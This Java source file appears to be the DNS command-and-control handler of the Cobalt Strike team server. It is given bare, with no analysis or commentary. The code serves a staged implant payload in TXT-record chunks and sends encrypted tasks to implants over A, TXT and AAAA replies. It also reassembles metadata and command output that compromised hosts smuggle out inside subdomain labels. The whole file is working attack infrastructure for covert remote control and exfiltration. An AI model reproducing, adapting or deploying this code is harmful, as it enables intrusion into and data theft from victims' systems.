package beacon;

import beacon.dns.CacheManager;
import beacon.dns.ConversationManager;
import beacon.dns.RecvConversation;
import beacon.dns.SendConversation;
import c2profile.Profile;
import common.CommonUtils;
import common.MudgeSanity;
import common.StringStack;
import dns.DNSServer;
import server.ServerUtils;

public class BeaconDNS implements DNSServer.Handler {
    protected Profile c2profile;
    protected BeaconC2 controller;
    protected DNSServer.Response idlemsg;
    protected long idlemask;
    protected String stager_subhost;
    protected CacheManager cache = new CacheManager();
    protected ConversationManager conversations;

    public BeaconDNS(Profile c2profile, BeaconC2 controller) {
        this.c2profile = c2profile;
        this.controller = controller;
        this.idlemask = CommonUtils.ipToLong(c2profile.getString(".dns_idle"));
        this.idlemsg = DNSServer.A(this.idlemask);
        this.conversations = new ConversationManager(c2profile);
        this.stager_subhost = !"".equals(c2profile.getString(".dns_stager_subhost")) ? c2profile.getString(".dns_stager_subhost") : null;
    }

    protected DNSServer.Response serveStage(String id) {
        String stage = this.c2profile.getString(".dns_stager_prepend") + ServerUtils.getBeaconDNSStage(this.controller.getResources());
        int offset = CommonUtils.toTripleOffset(id) * 255;
        if (!this.c2profile.option(".host_stage")) {
            return DNSServer.TXT(new byte[0]);
        }
        if (offset + 255 < stage.length()) {
            return DNSServer.TXT(CommonUtils.toBytes(stage.substring(offset, offset + 255)));
        }
        return DNSServer.TXT(CommonUtils.toBytes(stage.substring(offset)));
    }

    @Override
    public DNSServer.Response respond(String host, int type) {
        synchronized (this) {
            try {
                return this.respond_nosync(host, type);
            } catch (Exception ex) {
                MudgeSanity.logException("DNS request '" + host + "' type(" + type + ")", ex, false);
                return DNSServer.A(0L);
            }
        }
    }

    public DNSServer.Response respond_nosync(String host, int type) {
        StringStack parts = new StringStack(host.toLowerCase(), ".");
        if (parts.isEmpty()) {
            return DNSServer.A(0L);
        }
        String id = parts.shift();
        if (id.length() == 3 && "stage".equals(parts.peekFirst())) {
            return this.serveStage(id);
        }
        if ("cdn".equals(id) || "api".equals(id) || "www6".equals(id)) {
            parts = new StringStack(host.toLowerCase(), ".");
            String dtype = parts.shift();
            String nonce = parts.shift();
            id = parts.shift();
            if (this.cache.contains(id, nonce)) {
                return this.cache.get(id, nonce);
            }
            SendConversation f = null;
            if ("cdn".equals(dtype)) {
                f = this.conversations.getSendConversationA(id, dtype);
            } else if ("api".equals(dtype)) {
                f = this.conversations.getSendConversationTXT(id, dtype);
            } else if ("www6".equals(dtype)) {
                f = this.conversations.getSendConversationAAAA(id, dtype);
            }
            DNSServer.Response r;
            if (!f.started()) {
                byte[] tasks = this.controller.dump(id, 72000, 1048576);
                if (tasks.length > 0) {
                    tasks = this.controller.getSymmetricCrypto().encrypt(id, tasks);
                    r = f.start(tasks);
                } else {
                    r = type == 28 && "www6".equals(dtype) ? DNSServer.AAAA(new byte[16]) : DNSServer.A(0L);
                }
            } else {
                r = f.next();
            }
            if (f.isComplete()) {
                this.conversations.removeConversation(id, dtype);
            }
            this.cache.add(id, nonce, r);
            return r;
        }
        if ("www".equals(id) || "post".equals(id)) {
            String data = "";
            String next = parts.shift();
            char lent = next.charAt(0);
            parts = new StringStack(host.toLowerCase(), ".");
            String dtype = parts.shift();
            if (lent == '1') {
                String a;
                data = a = parts.shift().substring(1);
            } else if (lent == '2') {
                String a = parts.shift().substring(1);
                String b = parts.shift();
                data = a + b;
            } else if (lent == '3') {
                String a = parts.shift().substring(1);
                String b = parts.shift();
                String c = parts.shift();
                data = a + b + c;
            } else if (lent == '4') {
                String a = parts.shift().substring(1);
                String b = parts.shift();
                String c = parts.shift();
                String d = parts.shift();
                data = a + b + c + d;
            }
            String nonce = parts.shift();
            id = parts.shift();
            if (this.cache.contains(id, nonce)) {
                return this.cache.get(id, nonce);
            }
            RecvConversation f = this.conversations.getRecvConversation(id, dtype);
            f.next(data);
            if (f.isComplete()) {
                this.conversations.removeConversation(id, dtype);
                if ("www".equals(dtype)) {
                    this.controller.process_beacon_metadata("", f.result());
                } else if ("post".equals(dtype)) {
                    this.controller.process_beacon_callback(id, f.result());
                }
            }
            this.cache.add(id, nonce, this.idlemsg);
            return this.idlemsg;
        }
        if (CommonUtils.isNumber(id) && "beacon".equals(CommonUtils.session(id))) {
            this.cache.purge(id);
            this.conversations.purge(id);
            this.controller.getCheckinListener().update(id, System.currentTimeMillis(), null, false);
            if (this.controller.isCheckinRequired(id)) {
                return DNSServer.A(this.controller.checkinMask(id, this.idlemask));
            }
            return this.idlemsg;
        }
        if (this.stager_subhost != null && host.length() > 4 && host.toLowerCase().substring(3).startsWith(this.stager_subhost)) {
            return this.serveStage(host.substring(0, 3));
        }
        CommonUtils.print_info("DNS: ignoring " + host);
        return this.idlemsg;
    }
}

